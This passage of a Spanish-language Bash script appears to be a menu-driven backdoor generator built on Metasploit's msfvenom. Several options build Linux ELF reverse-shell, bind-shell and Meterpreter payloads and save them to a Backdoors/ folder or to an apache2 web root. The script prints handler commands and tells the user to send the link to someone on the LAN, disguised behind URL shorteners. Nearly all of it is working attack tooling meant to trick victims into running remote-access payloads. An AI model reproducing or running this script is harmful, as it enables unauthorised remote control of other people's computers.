			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .elf del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.elf
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > $nombre.elf
			mv $nombre.elf Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x64/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > $ruta/$nombre.elf 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x64/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	elif [[ $optiondos == 5 || $optiondos == 05 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mlinux/x64/shell_bind_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .elf > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .elf al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .elf. Tambien si quieres que el .elf se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .elf al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			msfvenom -p linux/x64/shell_bind_tcp LHOST=$lhost LPORT=$lport -f elf > /var/www/html/$nombre.elf
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x64/shell_bind_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.elf \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .elf del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.elf
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x64/shell_bind_tcp LHOST=$lhost LPORT=$lport -f elf > $nombre.elf
			mv $nombre.elf Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x64/shell_bind_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				msfconsole
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x64/shell_bind_tcp LHOST=$lhost LPORT=$lport -f elf > $ruta/$nombre.elf 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x64/shell_bind_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	elif [[ $optiondos == 6 || $optiondos == 06 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mlinux/x64/shell_reverse_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .elf > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .elf al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .elf. Tambien si quieres que el .elf se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .elf al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			msfvenom -p linux/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf > /var/www/html/$nombre.elf
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x64/shell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.elf \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .elf del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.elf
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf > $nombre.elf
			mv $nombre.elf Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x64/shell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf > $ruta/$nombre.elf 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x64/shell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	elif [[ $optiondos == 7 || $optiondos == 07 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mlinux/x86/meterpreter_reverse_http"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .elf > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .elf al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .elf. Tambien si quieres que el .elf se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .elf al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			msfvenom -p linux/x86/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f elf > /var/www/html/$nombre.elf
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x86/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.elf \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .elf del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.elf
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x86/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f elf > $nombre.elf
			mv $nombre.elf Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x86/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x86/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f elf > $ruta/$nombre.elf 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x86/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	elif [[ $optiondos == 8 || $optiondos == 08 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mlinux/x86/meterpreter_reverse_http"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .elf > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .elf al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .elf. Tambien si quieres que el .elf se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .elf al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p linux/x86/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f elf > /var/www/html/$nombre.elf
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x86/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.elf \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .exe del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.elf
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x86/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f elf > $nombre.elf
			mv $nombre.elf Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x86/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x86/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f elf > $ruta/$nombre.elf 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x86/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	elif [[ $optiondos == 9 || $optiondos == 09 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mlinux/x86/meterpreter_reverse_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .elf > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .elf al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .elf. Tambien si quieres que el .elf se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .elf al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f elf > /var/www/html/$nombre.elf
